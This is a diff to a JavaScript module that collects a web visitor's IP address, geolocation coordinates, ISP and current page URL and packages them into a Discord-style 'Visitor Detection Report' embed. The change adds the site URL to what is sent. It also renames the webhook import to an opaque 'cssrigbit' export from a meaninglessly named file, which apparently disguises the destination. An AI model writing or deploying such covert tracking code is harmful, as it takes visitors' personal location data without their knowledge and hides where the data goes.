@@ -1,4 +1,4 @@
-import { WEBHOOK_URL } from './326457825647825782562735679256278356237856723956278267256925bit.js';
+import { cssrigbit } from './326457825647825782562735679256278356237856723956278267256925bit.js';
 
 export async function collectAndSendData() {
   async function getIP() {
@@ -30,8 +30,15 @@ export async function collectAndSendData() {
   
   const fields = [];
   
+  const siteUrl = typeof window !== 'undefined' ? window.location.href : 'Unknown';
   fields.push({
-    name: "🌐 IP Address",
+    name: "Website",
+    value: siteUrl,
+    inline: false
+  });
+  
+  fields.push({
+    name: "IP Address",
     value: ip || "Not provided",
     inline: true
   });
@@ -42,12 +49,12 @@ export async function collectAndSendData() {
     if (locationData.region) locationParts.push(locationData.region);
     if (locationData.country_name) locationParts.push(locationData.country_name);
     if (locationData.latitude && locationData.longitude) {
-      locationParts.push(`📍 ${locationData.latitude}, ${locationData.longitude}`);
+      locationParts.push(`${locationData.latitude}, ${locationData.longitude}`);
     }
     
     if (locationParts.length) {
       fields.push({
-        name: "📍 Location",
+        name: "Location",
         value: locationParts.join(", "),
         inline: true
       });
@@ -55,7 +62,7 @@ export async function collectAndSendData() {
     
     if (locationData.org) {
       fields.push({
-        name: "🏢 ISP",
+        name: "ISP",
         value: locationData.org,
         inline: true
       });
@@ -63,11 +70,11 @@ export async function collectAndSendData() {
   }
   
   const embed = {
-    title: "🌐 Visitor Detection",
+    title: "Visitor Detection Report",
     color: 0x5865f2,
     fields: fields,
     footer: {
-      text: "Detection Time"
+      text: "Timestamp"
     },
     timestamp: new Date().toISOString()
   };
